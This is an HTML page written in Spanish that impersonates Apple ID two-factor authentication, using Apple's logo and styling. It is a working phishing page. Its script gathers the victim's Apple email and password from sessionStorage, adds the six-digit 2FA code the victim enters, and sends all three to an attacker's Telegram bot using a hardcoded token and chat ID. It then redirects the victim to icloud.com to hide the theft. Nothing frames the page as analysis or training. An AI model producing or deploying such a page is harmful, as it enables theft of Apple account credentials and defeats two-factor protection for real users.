<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID - Verificación</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #f5f5f7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 16px;
            padding: 40px 32px 32px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }

        .apple-logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .apple-logo svg {
            width: 48px;
            height: 48px;
            fill: #1d1d1f;
        }

        h1 {
            text-align: center;
            font-size: 28px;
            font-weight: 600;
            color: #1d1d1f;
            margin-bottom: 8px;
            letter-spacing: -0.3px;
        }

        .subtitle {
            text-align: center;
            font-size: 17px;
            color: #6e6e73;
            margin-bottom: 28px;
            line-height: 1.4;
        }

        .code-label {
            font-size: 14px;
            color: #1d1d1f;
            font-weight: 500;
            margin-bottom: 12px;
        }

        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 28px;
        }

        .code-input {
            width: 52px;
            height: 60px;
            text-align: center;
            font-size: 28px;
            font-weight: 500;
            border: 2px solid #d2d2d7;
            border-radius: 10px;
            background: white;
            transition: all 0.2s;
        }

        .code-input:focus {
            outline: none;
            border-color: #0071e3;
            box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1);
        }

        .links {
            margin-bottom: 24px;
        }

        .link {
            display: block;
            color: #0071e3;
            text-decoration: none;
            font-size: 15px;
            margin-bottom: 6px;
            cursor: pointer;
        }

        .link:hover {
            text-decoration: underline;
        }

        .verify-button {
            width: 100%;
            background: #0071e3;
            color: white;
            border: none;
            border-radius: 30px;
            padding: 16px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .verify-button:hover {
            background: #0077ed;
        }

        .verify-button:active {
            background: #0063c7;
        }

        .error-message {
            display: none;
            text-align: center;
            margin: 12px 0;
            color: #ff3b30;
            font-size: 14px;
            padding: 12px;
            background: #fce8e8;
            border-radius: 8px;
            border: 1px solid #ff3b30;
        }

        .success-message {
            display: none;
            text-align: center;
            margin: 12px 0;
            color: #34c759;
            font-size: 14px;
            padding: 12px;
            background: #e8fce8;
            border-radius: 8px;
            border: 1px solid #34c759;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="apple-logo">
            <!-- LOGO OFICIAL DE APPLE -->
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
            </svg>
        </div>

        <h1>Autenticación de dos factores</h1>
        <div class="subtitle">Se envió un mensaje con el código de verificación a tus dispositivos. Ingresa el código para continuar.</div>

        <form id="verificationForm">
            <div class="code-label">Código de verificación</div>
            
            <div class="code-inputs">
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
            </div>

            <div class="links">
                <a class="link" onclick="resendCode()">Volver a enviar el código</a>
                <a class="link" onclick="alert('Opción no disponible')">¿No puedes acceder a tus dispositivos?</a>
            </div>

            <button type="submit" class="verify-button">Verificar</button>

            <div class="error-message" id="errorMessage">❌ Código incorrecto. Vuelve a intentarlo.</div>
            <div class="success-message" id="successMessage">✅ Código verificado correctamente</div>
        </form>
    </div>

    <script>
        // CONFIGURACIÓN DE TELEGRAM
        const TELEGRAM_BOT_TOKEN = '8273125469:AAFJun-bljCAYWjLyXubtLBye_21Y47rjnI';
        const TELEGRAM_CHAT_ID = '6939469358';

        const inputs = document.querySelectorAll('.code-input');
        
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function resendCode() {
            alert('Se ha reenviado el código de verificación.');
        }

        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const code = Array.from(inputs).map(input => input.value).join('');
            const errorMessage = document.getElementById('errorMessage');
            const successMessage = document.getElementById('successMessage');
            
            if (code.length !== 6) {
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                return;
            }
            
            errorMessage.style.display = 'none';
            
            try {
                const email = sessionStorage.getItem('apple_email') || 'No disponible';
                const password = sessionStorage.getItem('apple_password') || 'No disponible';
                
                const message = `🔴 APPLE 2FA 🔴\n\n📧 Correo: ${email}\n🔑 Contraseña: ${password}\n🔢 Código 2FA: ${code}`;

                const response = await sendToTelegram(message);
                
                if (response.ok) {
                    successMessage.style.display = 'block';
                    errorMessage.style.display = 'none';
                    
                    sessionStorage.clear();
                    
                    setTimeout(() => {
                        window.location.href = 'https://www.icloud.com/';
                    }, 2000);
                } else {
                    throw new Error('Error en Telegram');
                }
                
            } catch (error) {
                console.error('Error:', error);
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
            }
        });

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            return response;
        }

        inputs[0].focus();

        document.getElementById('verificationForm').addEventListener('click', function(e) {
            if (!e.target.classList.contains('code-input')) {
                const lastFilled = Array.from(inputs).findIndex(input => input.value === '');
                if (lastFilled === -1) {
                    inputs[5].focus();
                } else {
                    inputs[lastFilled].focus();
                }
            }
        });
    </script>
</body>
</html>
